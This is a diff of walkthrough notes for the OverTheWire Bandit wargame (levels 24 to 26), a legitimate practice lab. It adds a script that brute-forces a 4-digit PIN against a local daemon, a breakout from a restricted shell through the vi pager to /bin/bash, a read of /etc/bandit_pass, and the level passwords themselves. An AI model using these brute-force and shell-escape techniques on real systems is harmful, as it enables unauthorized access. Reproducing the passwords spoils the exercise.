@@ -4,9 +4,8 @@
 
 ```bash
 ssh bandit0@bandit.labs.overthewire.org -p 2220
-```
-
 password: bandit0
+```
 
 - level 0-1:
 
@@ -336,6 +335,47 @@ cp script.sh /var/spool/bandit24/foo
 ls -l
 cat password
 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
+
+- Level 24-25:
+```bash
+nc localhost 30002
+mkdir /tmp/brute
+cd /tmp/brute
+nano script.sh
+#insert this script:
+for i in {0000..9999}
+do
+  echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> list.txt;
+done
+#end of script
+ls # to confirm that the script was created
+chmod +x script.sh #giving permissions
+./script.sh #running script
+cat list.txt #if you want to see the script running inside the txt file
+cat list.txt | nc localhost 30002 #to get the level 25 password 
+iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
+- Level 25-26:
+```bash
+#try to connect using the private key found in level 25
+ssh -i /tmp/bandit26.sshkey bandit26@localhost -p 2220
+# you will see that the connection closes quickly
+# you will have to minimize the bash screen in a very small size so the text "bandit" won't be full loaded (this will make the server doesn't close. To confirm that you did it write, it will show a "more" command with a "%" about how much per cent it is loading about the text.
+#after that you can full the screen again and press "v" to edit the shell
+v
+:set shell? #to see which file the shell is running when is called
+:set shell= /bin/bash #to change the file running through the shell
+:set shell? #to confirm that the shell is running in the right file now
+:shell #to run the shell script properly
+cat /etc/bandit_pass/bandit26 #after confirm the shell script worked, get the password in this file
+s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+```
+
+- Level 26-27:
+```bash
+
 ```
 
 # COMMANDS:
